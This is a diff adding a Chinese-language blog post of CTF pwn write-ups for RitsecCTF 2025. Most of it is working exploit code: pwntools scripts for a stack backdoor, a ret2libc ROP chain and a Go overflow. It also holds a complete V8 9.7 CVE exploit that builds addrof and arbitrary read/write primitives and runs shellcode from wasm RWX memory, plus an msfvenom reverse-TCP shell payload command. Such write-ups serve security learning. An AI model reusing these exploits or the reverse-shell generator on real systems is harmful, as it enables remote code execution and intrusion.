@@ -1,0 +1,308 @@
+export const layout = "#components/Page.js";
+export const title = "RitsecCTF 2025 Writeup";
+export const description = "2025 RitsecCTF Pwn 题解";
+export const created = "2025-04-08T10:28:47+08:00";
+
+# RitsecCTF 2025 Writeup
+
+跟 n1 junior 的师傅们一起打了这场比赛，4 道出了 3 道，简单记录一下。
+
+
+## bit_burger
+
+思路比较简单，利用了函数调用/返回后不会清理栈空间的特性，先通过第一个位操作在栈上构造一个 backdoor 地址出来，第二步直接调用就可以了。
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "bit_burger.bin_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+io = remote("binex-bitburger.ctf.ritsec.club", 32200) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, "b *0x401598")
+
+ogg = 0x401355
+s = "0" + bin(ogg)[2:]
+for i in range(len(s)):
+    if s[len(s) - i - 1] == "1":
+        io.sendlineafter(b"(y/n)? ", b"y")
+    elif s[len(s) - i - 1] == "0":
+        io.sendlineafter(b"(y/n)? ", b"n")
+# io.sendlineafter(b"(y/n)? ", b"n")
+io.sendlineafter(b"Would you like that grilled or fried?: ", p64(114514))
+io.interactive()
+```
+
+
+## hashmatch
+
+比较怪的题，当 ret2libc 打的。
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "./hashmatch_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, "b *0x4013c7")
+
+
+pop_rdi_ret = 0x00000000004011f6
+
+io.recvuntil(b"is:\n")
+md5 = io.recvuntil(b"\n", drop=True).decode()
+
+payload = cyclic(1016, n=8)
+payload += flat([pop_rdi_ret, elf.got['puts'], elf.plt['puts'], elf.sym['game']])
+io.sendline(payload)
+io.recvuntil(b":(\n")
+libc_base = u64(io.recvuntil(b"\nY", drop=True).ljust(8, b"\x00")) - 0x77820
+log.info(f"libc_base => {hex(libc_base)}")
+binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
+log.info(f"binsh => {hex(binsh)}")
+system = 0x04013C7
+
+payload2 = cyclic(1008, n=8) + p64(binsh)
+payload2 += flat([pop_rdi_ret, binsh, system])
+
+io.sendline(payload2)
+io.interactive()
+```
+
+
+## starship_registration
+
+神秘 go pwn，出题人很良心给了调试信息，但是很久没逆向 go 做起来还是比较吃力。
+
+感觉做这种题的办法还是自己写一个小 poc 逆出来看看，比如 `println` 这种，会发现它的第一个参数就是输出流，没什么用，但是直接硬看 ida 反编译的结果的话会感觉很抽象。
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./registration"
+context.log_level = "info"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, "b 0x4ABC4C")
+
+
+def initship(name, size, weight, speed, flag):
+    io.sendlineafter(b"(max 15): ", str(len(name)).encode())
+    io.sendlineafter(b": ", name)
+    io.sendlineafter(b"(max 15): ", str(len(size)).encode())
+    io.sendlineafter(b": ", size)
+    io.sendlineafter(b"(max 15): ", str(len(weight)).encode())
+    io.sendlineafter(b": ", weight)
+    io.sendlineafter(b"(max 15): ", str(len(speed)).encode())
+    io.sendlineafter(b": ", speed)
+    io.sendlineafter(b"(max 15): ", b"0")
+    io.sendlineafter(b": ", flag)
+
+
+io.recvuntil(b"ship")
+io.sendline()
+
+initship(b"a", b"b", b"c", b"d", b"e" * 24)
+io.recvuntil(b"Flag: ")
+res = io.recvuntil(b"Thank")
+
+backdoor = u64(res[24:27].ljust(8, b"\x00"))
+
+io.sendlineafter(b"choice: ", b"6")
+io.sendline(b"0")
+payload = b"a" * 24 + p64(backdoor)
+io.sendlineafter(b": ", payload)
+io.sendlineafter(b"choice: ", b"2")
+io.interactive()
+```
+
+
+## examination_station
+
+v8 pwn，出题人没有提供 patch 文件，说明是打 cve。
+
+主要到版本号为 9.7.106.21，在搜索引擎上很容易找到 mailing list 里对应的 [cve](https://issues.chromium.org/issues/40061500)
+
+其中有 exp.js，拿来直接打就行，注意需要更换一下 shellcode。
+
+```bash
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=2333 -f raw | xxd -p | sed 's/\(..\)/0x\1, /g' | fold --spaces --width 50
+```
+
+
+```javascript
+let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
+let wasm_mod = new WebAssembly.Module(wasm_code);
+let wasm_instance = new WebAssembly.Instance(wasm_mod);
+let f = wasm_instance.exports.main;
+
+// shellcoode /bin/bash
+// const shellcode = new Uint8Array([0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52,0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69,0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x56, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58, 0x0f,0x05]);
+
+// shellcode calculator
+// const shellcode = new Uint8Array([0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01,
+// 	0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x0a, 0xa8,
+// 	0x01, 0x5e, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f,
+// 	0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75,
+// 	0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
+// 	0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05]);
+
+const shellcode = new Uint8Array([0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
+  0x00, 0x99, 0x50, 0x54, 0x5f, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8,
+  0x0d, 0x00, 0x00, 0x00, 0x63, 0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74,
+  0x78, 0x74, 0x00, 0x56, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58, 0x0f, 0x05,]);
+
+
+const buf = new ArrayBuffer(8);
+const f64 = new Float64Array(buf);
+const u32 = new Uint32Array(buf);
+const bigUint64 = new BigUint64Array(buf);
+f2i = (val) => {
+    f64[0] = val;
+    return bigUint64[0];
+}
+i2f = (val) => {
+    bigUint64[0] = val;
+    return f64[0];
+}
+d2u = (v) => {
+    f64[0] = v;
+    return Array.from(u32);
+}
+u2d = (lo, hi) => {
+    u32[0] = lo;
+    u32[1] = hi;
+    return f64[0];
+}
+ByteToBigIntArray = (payload) => {
+    let sc = []
+    let tmp = 0n;
+    let lenInt = BigInt(Math.floor(payload.length / 8))
+    for (let i = 0n; i < lenInt; i += 1n) {
+        tmp = 0n;
+        for (let j = 0n; j < 8n; j++) {
+            tmp += BigInt(payload[i * 8n + j]) * (0x1n << (8n * j));
+        }
+        sc.push(tmp);
+    }
+    let len = payload.length % 8;
+    tmp = 0n;
+    for (let i = 0n; i < len; i++) {
+        tmp += BigInt(payload[lenInt * 8n + i]) * (0x1n << (8n * i));
+    }
+    sc.push(tmp);
+    return sc;
+}
+function trigger() {
+    let v1;
+    function f0(v4) {
+        v4(() => { }, v5 => {
+            v1 = v5.errors;
+        });
+    }
+    f0.resolve = function (v6) {
+        return v6;
+    };
+    let v3 = {
+        then(v7, v8) {
+            v8();
+        }
+    };
+    Promise.any.call(f0, [v3]);
+    return v1[1];
+}
+let hole = trigger();
+var map = new Map();
+map.set('kiprey', 8);
+map.set(hole, 0x8);
+map.delete(hole);
+map.delete(hole);
+map.delete("kiprey");
+print(map.size);
+map.set(0x18, "kiprey");
+var nop = new Array(1);
+var oobArray = [];
+oobArray.push(1.1);
+var objArray = {
+    "tag": 0xdead,
+    "leak": 0x1234,
+};
+bigUintArray = new BigUint64Array(6);
+bigUintArray[0] = 0x1234n;
+bigUintArray[1] = 0x5678n;
+map.set("1", "kiprey");
+addrof = (obj) => {
+    objArray.leak = obj;
+    for (let i = 0; i < 0x3000; i++) {
+        let half = d2u(oobArray[i]);
+        if (half[0] == (0xdead << 1)) {
+            ret = half[1];
+            break;
+        } else if (half[1] == (0xdead << 1)) {
+            ret = d2u(oobArray[i + 1])[0];
+            break;
+        }
+    }
+    return BigInt(ret);
+}
+
+let base_offset;
+let external_offset;
+let big_len_offset;
+for (let i = 0; i < 0x3000; i++) {
+    if (f2i(oobArray[i]) == 0x1234) {
+        base_offset = i + 12;
+        external_offset = i + 11;
+        big_len_offset = i + 10;
+        break;
+    }
+}
+
+let base_ptr = f2i(oobArray[base_offset]);
+let external_ptr = f2i(oobArray[external_offset]);
+let big_len = f2i(oobArray[big_len_offset]);
+
+arb_r = (addr) => {
+    oobArray[base_offset] = i2f(addr - 0x8n);
+    let ret = bigUintArray[0];
+    return ret;
+}
+
+arb_w = (addr, payload) => {
+    let sc = ByteToBigIntArray(payload);
+    oobArray[big_len_offset] = i2f(BigInt(sc.length));
+    oobArray[base_offset] = i2f(0n);
+    oobArray[external_offset] = i2f(addr);
+    for (let i = 0; i < sc.length; i += 1) {
+        bigUintArray[i] = sc[i];
+    }
+}
+
+
+let rwx_mem = arb_r(addrof(wasm_instance) + 0x60n);
+print(rwx_mem.toString(16));
+arb_w(rwx_mem, shellcode);
+f();
+```
+
+
+后记：参考这道题目，给 N1Junior CTF 2/2 出了一道 v8 cve 签到题。
